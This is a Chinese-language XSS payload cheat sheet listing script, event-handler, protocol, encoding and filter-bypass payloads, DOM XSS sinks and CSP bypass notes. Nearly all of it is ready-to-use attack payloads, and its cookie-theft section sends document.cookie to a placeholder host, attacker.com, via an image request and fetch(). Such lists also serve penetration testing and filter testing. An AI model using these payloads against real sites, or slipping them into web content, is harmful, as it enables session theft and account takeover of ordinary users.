# XSS Payload 速查表

> 常用 XSS Payload 集合，持续更新中

---

## 🎯 基础弹窗

```html
<!-- 最经典 -->
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- 简写 -->
<script>alert`1`</script>
```

---

## 🏷️ 标签类

### img 标签
```html
<img src=x onerror=alert(1)>
<img src=x onerror="alert(1)">
<img/src=x onerror=alert(1)>
<img src=x onerror=alert`1`>

<!-- 不闭合 -->
<img src=x onerror=alert(1)
```

### svg 标签
```html
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg><script>alert(1)</script>
<svg><script>alert&#40;1&#41;</script>
```

### body 标签
```html
<body onload=alert(1)>
<body onpageshow=alert(1)>
```

### input 标签
```html
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>
```

### details 标签
```html
<details open ontoggle=alert(1)>
```

### marquee 标签
```html
<marquee onstart=alert(1)>
```

### video/audio 标签
```html
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### iframe 标签
```html
<iframe src="javascript:alert(1)">
<iframe srcdoc="<script>alert(1)</script>">
```

---

## 🔗 协议类

### javascript: 协议
```html
<a href="javascript:alert(1)">click</a>
<a href="javascript:alert`1`">click</a>
<a href="&#106;avascript:alert(1)">click</a>
```

### data: 协议
```html
<a href="data:text/html,<script>alert(1)</script>">click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
```

---

## 🔄 绕过技巧

### 大小写混淆
```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
```

### 双写绕过
```html
<scrscriptipt>alert(1)</scrscriptipt>
<scr<script>ipt>alert(1)</scr</script>ipt>
```

### 空格替换
```html
<img/src=x/onerror=alert(1)>
<img	src=x	onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>
<img%0dsrc=x%0donerror=alert(1)>
```

### 换行绕过
```
<img src=x onerror
=alert(1)>
```

### 注释绕过
```html
<script>alert(1)//</script>
<script>alert(1)/*</script>
<!--><script>alert(1)</script>
```

---

## 🔣 编码绕过

### HTML 实体编码
```html
<!-- 十进制 -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- 十六进制 -->
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;

<!-- 括号编码 -->
<svg><script>alert&#40;1&#41;</script>
```

### URL 编码
```
%3Cscript%3Ealert(1)%3C/script%3E
%0a (换行)
%0d (回车)
%08 (退格)
```

### Unicode 编码
```javascript
\u0061lert(1)  // alert(1)
```

### JSFuck（非字母数字）
```javascript
// alert(1) 的 JSFuck 版本
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]...
```

---

## 🚫 过滤绕过

### 括号被过滤
```html
<script>alert`1`</script>
<script>onerror=alert;throw 1</script>
<script>eval.call`${'alert\x281\x29'}`</script>
```

### 引号被过滤
```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert(/xss/)>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

### script 被过滤
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### on 事件被过滤
```html
<script>alert(1)</script>
<a href=javascript:alert(1)>click</a>
```

---

## 🌐 DOM XSS

```javascript
// URL 参数
document.location = 'javascript:alert(1)'
window.location.href = 'javascript:alert(1)'

// innerHTML
element.innerHTML = '<img src=x onerror=alert(1)>'

// document.write
document.write('<script>alert(1)</script>')

// eval
eval('alert(1)')
```

---

## 📋 Cookie 窃取

```javascript
// 发送到攻击者服务器
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

// fetch 方式
<script>
fetch('http://attacker.com/steal?c='+document.cookie);
</script>
```

---

## 🔧 实用技巧

### 确认 XSS 存在
```javascript
alert(1)
alert(document.domain)
console.log('XSS')
```

### 定位注入点
```javascript
alert(document.URL)
alert(window.location)
```

### 绕过 CSP
```html
<!-- 如果允许 'unsafe-inline' -->
<script>alert(1)</script>

<!-- 如果允许某些 CDN -->
<script src="https://allowed-cdn.com/angular.js"></script>
```

---

**持续更新中...**
